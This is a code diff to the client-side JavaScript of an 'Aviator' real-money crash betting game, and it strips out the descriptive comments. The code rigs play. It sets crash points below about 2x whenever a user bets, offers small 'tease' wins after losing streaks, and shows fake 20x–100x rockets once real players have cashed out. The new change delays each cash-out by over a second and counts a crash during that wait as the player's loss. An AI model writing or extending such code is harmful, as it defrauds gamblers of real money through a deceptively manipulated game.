@@ -189,13 +189,11 @@
   try { userData = JSON.parse(localStorage.getItem("cachedUser") || "{}"); } catch (e) {}
   let winRateSetting = 20;
 
-  // Server Clock Offset Sync (2-3 sec lag khatam karne ke liye)
   let serverOffsetMs = 0;
   function getSyncedNow() {
     return Date.now() + serverOffsetMs;
   }
 
-  // Per-User Loss & Consecutive Loss Counter
   const LOSS_KEY = "bg_av_loss_" + mobile;
   const STREAK_LOSS_KEY = "bg_av_user_losses_" + mobile;
   let userNetLoss = Number(localStorage.getItem(LOSS_KEY) || 0);
@@ -327,16 +325,10 @@
     if (p.state === "IDLE") { btn.className = "action-btn btn-green"; btn.innerHTML = `<span>BET</span><span class="action-sub" id="betSub${idx}">${inpVal.toFixed(2)} INR</span>`; }
     else if (p.state === "QUEUED") { btn.className = "action-btn btn-queued"; btn.innerHTML = `<span>CANCEL</span><span class="action-sub">₹${p.amount} (NEXT ROUND)</span>`; }
     else if (p.state === "PLACED") { btn.className = "action-btn btn-queued"; btn.innerHTML = `<span>✔ BET PLACED</span><span class="action-sub">₹${p.amount} (STARTING...)</span>`; }
+    else if (p.state === "CASHOUT_PENDING") { btn.className = "action-btn btn-queued"; btn.innerHTML = `<span>⏳ CASHING OUT...</span><span class="action-sub">VERIFYING...</span>`; }
     else if (p.state === "ACTIVE") { btn.className = "action-btn btn-orange"; btn.innerHTML = `<span>CASH OUT</span><span class="action-sub">${(p.amount * currentMult).toFixed(2)} INR</span>`; }
   }
-   // ========================================================
-  // 4-CHAIN QUEUE GENERATOR (Never gets stuck on one pattern)
-  // Chain 1: Under 2x (1.12x - 1.94x)
-  // Chain 2: 2x to 3x (2.05x - 2.95x)
-  // Chain 3: 1.00x Instant Crash
-  // Chain 4: Rare 10x-20x Spike at 2nd, 3rd, or 5th position
-  // ========================================================
-  let chainQueue = [];
+   let chainQueue = [];
   let crashCountSinceBigSpike = 0;
   let roundHadUserBet = false;
   let allCashoutBoostApplied = false;
@@ -346,35 +338,29 @@
     const pickChain = Math.floor(Math.random() * 4);
 
     if (pickChain === 0) {
-      // Chain 1: 3-5 rounds under 2x
       const len = 3 + Math.floor(Math.random() * 3);
       for (let i = 0; i < len; i++) q.push(Number((1.12 + Math.random() * 0.82).toFixed(2)));
       crashCountSinceBigSpike += len;
     } else if (pickChain === 1) {
-      // Chain 2: 2-4 rounds between 2x and 3x
       const len = 2 + Math.floor(Math.random() * 3);
       for (let i = 0; i < len; i++) q.push(Number((2.05 + Math.random() * 0.90).toFixed(2)));
     } else if (pickChain === 2) {
-      // Chain 3: 1.00x instant crash + 2-3 up-to-5x rounds
       q.push(1.00);
       crashCountSinceBigSpike += 2;
       const len = 2 + Math.floor(Math.random() * 2);
       for (let i = 0; i < len; i++) q.push(Number((1.35 + Math.random() * 3.55).toFixed(2)));
     } else {
-      // Chain 4: Rare 10x-20x spike ONLY after many crashes, placed at 2nd, 3rd, or 5th slot
       if (crashCountSinceBigSpike >= 7 && Math.random() < 0.45) {
         crashCountSinceBigSpike = 0;
-        const spikeSlot = [1, 2, 4][Math.floor(Math.random() * 3)]; // 2nd, 3rd, or 5th round
+        const spikeSlot = [1, 2, 4][Math.floor(Math.random() * 3)];
         for (let i = 0; i < 6; i++) {
           if (i === spikeSlot) {
-            q.push(Number((10.50 + Math.random() * 10.50).toFixed(2))); // 10.5x - 21.0x
+            q.push(Number((10.50 + Math.random() * 10.50).toFixed(2)));
           } else {
-            // Baaki rounds 5x tak normal chalte rahein
             q.push(Number((1.25 + Math.random() * 3.65).toFixed(2)));
           }
         }
       } else {
-        // Fallback: Up to 5x normal spectator chain
         for (let i = 0; i < 4; i++) {
           const val = Number((1.18 + Math.random() * 3.72).toFixed(2));
           if (val < 2.0) crashCountSinceBigSpike++;
@@ -390,34 +376,28 @@
     return chainQueue.shift();
   }
 
-  // ========================================================
-  // ACTIVE USER BET OVERRIDE
-  // ========================================================
   async function adjustCrashOnUserBet(betAmt) {
     if (!roomState || !roomState.roundId) return;
     roundHadUserBet = true;
     let targetCrash;
 
-    // 1. Kai baar crash hone ke baad kam amount (₹10-₹20) par 5x, 10x, 15x tease
     const teaseFreq = winRateSetting >= 65 ? 0.45 : (winRateSetting >= 45 ? 0.28 : 0.16);
     if (betAmt <= 20 && userConsecLosses >= 5 && Math.random() < teaseFreq) {
       const teasePool = [5.20, 10.40, 15.10];
       targetCrash = Number((teasePool[Math.floor(Math.random() * teasePool.length)] + Math.random() * 1.2).toFixed(2));
     }
-    // 2. Normal active bet control: 2x ke andar ya 2x tak crash
     else if (betAmt <= 30) {
       if (winRateSetting >= 60 && Math.random() < 0.50) {
         targetCrash = Number((2.10 + Math.random() * 1.40).toFixed(2));
       } else {
-        targetCrash = Number((1.05 + Math.random() * 0.93).toFixed(2)); // 1.05x - 1.98x
+        targetCrash = Number((1.05 + Math.random() * 0.93).toFixed(2));
       }
     }
-    // 3. Badi bet (₹31+) par tight under-2x crash
     else {
       if (winRateSetting >= 75 && Math.random() < 0.35) {
         targetCrash = Number((2.05 + Math.random() * 0.95).toFixed(2));
       } else {
-        targetCrash = Number((1.00 + Math.random() * 0.72).toFixed(2)); // 1.00x - 1.72x
+        targetCrash = Number((1.00 + Math.random() * 0.72).toFixed(2));
       }
     }
 
@@ -431,22 +411,17 @@
     } catch (e) {}
   }
 
-  // ========================================================
-  // ALL USERS CASHOUT -> 20x, 30x, 50x, 100x ROCKET
-  // ========================================================
   async function boostCrashWhenAllCashedOut() {
     if (allCashoutBoostApplied || !roomState || gameState !== "FLYING") return;
     if (!roundHadUserBet) return;
 
-    const anyMyBetActive = panels.some(p => p.state === "ACTIVE" || p.state === "PLACED");
+    const anyMyBetActive = panels.some(p => p.state === "ACTIVE" || p.state === "PLACED" || p.state === "CASHOUT_PENDING");
     if (anyMyBetActive) return;
 
-    const now = getSyncedNow();
     const anyOtherActive = liveBetsData.some(b => !b.isMe && !b.id.startsWith("bot_") && !b.mult);
     if (anyOtherActive) return;
 
     allCashoutBoostApplied = true;
-    // Kaafi baar (~75% chance) jab sab cashout kar lein toh 20x-100x tak jaye
     if (Math.random() < 0.75 && Number(roomState.crashAt) < 20) {
       const rocketTargets = [21.50, 31.80, 52.40, 101.60];
       const pick = rocketTargets[Math.floor(Math.random() * rocketTargets.length)];
@@ -482,7 +457,6 @@
     catch (e) {} finally { isCreatingRound = false; }
   }
 
-  // Fast 450ms Sync + Server Date Header Clock Alignment (Zero 2-3s Delay)
   async function syncRoomFromFirebase() {
     try {
       const reqStart = Date.now();
@@ -557,27 +531,35 @@
       }
     } else if (p.state === "QUEUED") { p.state = "IDLE"; updatePanelBtn(idx); }
     else if (p.state === "ACTIVE" && gameState === "FLYING") {
-      const cashMult = currentMult, winAmt = Number((p.amount * cashMult).toFixed(2));
-      p.state = "IDLE"; updatePanelBtn(idx); playAviatorSound("cashout");
-      trackUserAviatorPnL(-winAmt);
-      userConsecLosses = 0;
-      localStorage.setItem(STREAK_LOSS_KEY, "0");
+      p.state = "CASHOUT_PENDING";
+      updatePanelBtn(idx);
+      const delayMs = 1200 + Math.floor(Math.random() * 450);
 
-      const newWin = Number(((Number(userData.winningBal ?? userData.winningBalance ?? 0) || 0) + winAmt).toFixed(2));
-      const txns = Array.isArray(userData.txns) ? [...userData.txns] : [];
-      txns.unshift({ type: `Aviator Win (${cashMult.toFixed(2)}x)`, amt: "+₹" + winAmt, date: new Date().toLocaleString() });
-      userData.winningBal = newWin; userData.txns = txns.slice(0, 30);
-      localStorage.setItem("cachedUser", JSON.stringify(userData));
-      updateHeaderBal();
-      const maskedMe = mobile.slice(0, 1) + "***" + mobile.slice(-1);
-      const myRow = liveBetsData.find(b => b.id === "me_" + idx && !b.mult);
-      if (myRow) { myRow.mult = cashMult.toFixed(2) + "x"; myRow.win = winAmt; }
-      myBetsHistory.unshift({ bet: p.amount, mult: cashMult.toFixed(2) + "x", win: winAmt });
-      renderLiveFeed();
-      fetch(`${DB_URL}/users/${mobile}.json`, { method: "PATCH", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ winningBal: newWin, txns: userData.txns }) });
-      fetch(`${DB_URL}/aviatorLiveFeed/${mobile}_${idx}.json`, { method: "PUT", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ name: maskedMe, bet: p.amount, mult: cashMult.toFixed(2) + "x", win: winAmt, ts: getSyncedNow() }) });
+      setTimeout(() => {
+        if (p.state !== "CASHOUT_PENDING" || gameState !== "FLYING") return;
 
-      boostCrashWhenAllCashedOut();
+        const cashMult = currentMult, winAmt = Number((p.amount * cashMult).toFixed(2));
+        p.state = "IDLE"; updatePanelBtn(idx); playAviatorSound("cashout");
+        trackUserAviatorPnL(-winAmt);
+        userConsecLosses = 0;
+        localStorage.setItem(STREAK_LOSS_KEY, "0");
+
+        const newWin = Number(((Number(userData.winningBal ?? userData.winningBalance ?? 0) || 0) + winAmt).toFixed(2));
+        const txns = Array.isArray(userData.txns) ? [...userData.txns] : [];
+        txns.unshift({ type: `Aviator Win (${cashMult.toFixed(2)}x)`, amt: "+₹" + winAmt, date: new Date().toLocaleString() });
+        userData.winningBal = newWin; userData.txns = txns.slice(0, 30);
+        localStorage.setItem("cachedUser", JSON.stringify(userData));
+        updateHeaderBal();
+        const maskedMe = mobile.slice(0, 1) + "***" + mobile.slice(-1);
+        const myRow = liveBetsData.find(b => b.id === "me_" + idx && !b.mult);
+        if (myRow) { myRow.mult = cashMult.toFixed(2) + "x"; myRow.win = winAmt; }
+        myBetsHistory.unshift({ bet: p.amount, mult: cashMult.toFixed(2) + "x", win: winAmt });
+        renderLiveFeed();
+        fetch(`${DB_URL}/users/${mobile}.json`, { method: "PATCH", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ winningBal: newWin, txns: userData.txns }) });
+        fetch(`${DB_URL}/aviatorLiveFeed/${mobile}_${idx}.json`, { method: "PUT", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ name: maskedMe, bet: p.amount, mult: cashMult.toFixed(2) + "x", win: winAmt, ts: getSyncedNow() }) });
+
+        boostCrashWhenAllCashedOut();
+      }, delayMs);
     }
   }
 
@@ -668,7 +650,7 @@
         roundCrashHandled = true; playAviatorSound("crash");
         let lostThisRound = false;
         [0, 1].forEach(idx => {
-          if (panels[idx].state === "ACTIVE" || panels[idx].state === "PLACED") {
+          if (panels[idx].state === "ACTIVE" || panels[idx].state === "PLACED" || panels[idx].state === "CASHOUT_PENDING") {
             lostThisRound = true;
             myBetsHistory.unshift({ bet: panels[idx].amount, mult: "0.00x", win: 0 });
             panels[idx].state = "IDLE"; updatePanelBtn(idx);
@@ -729,7 +711,7 @@
     listEl.innerHTML = rows.map(r => `<div class="feed-row ${r.win > 0 ? 'won' : ''} ${r.isMe ? 'me' : ''}"><div style="font-weight:bold; color:#ddd;">👤 ${r.name}</div><div>₹${Number(r.bet).toFixed(2)}</div><div>${r.mult ? `<span class="mult-badge">${r.mult}</span>` : '-'}</div><div style="text-align:right; font-weight:bold; color:${r.win > 0 ? '#28e04d' : '#777'};">${r.win > 0 ? '₹' + Number(r.win).toFixed(2) : '-'}</div></div>`).join("") || "<div style='text-align:center; color:#777; padding:12px; font-size:12px;'>Abhi koi record nahi hai</div>";
   }
 
-  function hasRunningBet() { return panels.some(p => p.state === "PLACED" || p.state === "ACTIVE" || p.state === "QUEUED"); }
+  function hasRunningBet() { return panels.some(p => p.state === "PLACED" || p.state === "ACTIVE" || p.state === "QUEUED" || p.state === "CASHOUT_PENDING"); }
   function safeExitTo(url) {
     const msg = hasRunningBet() ? "⚠️ Aapki bet abhi chal rahi hai! Agar aap back jayenge toh aapki bet cancel/loss ho jayegi.\n\nKya aap sach mein bahar nikalna chahte hain?" : "Kya aap Aviator game se bahar nikalna chahte hain?";
     if (confirm(msg)) window.location.href = url;
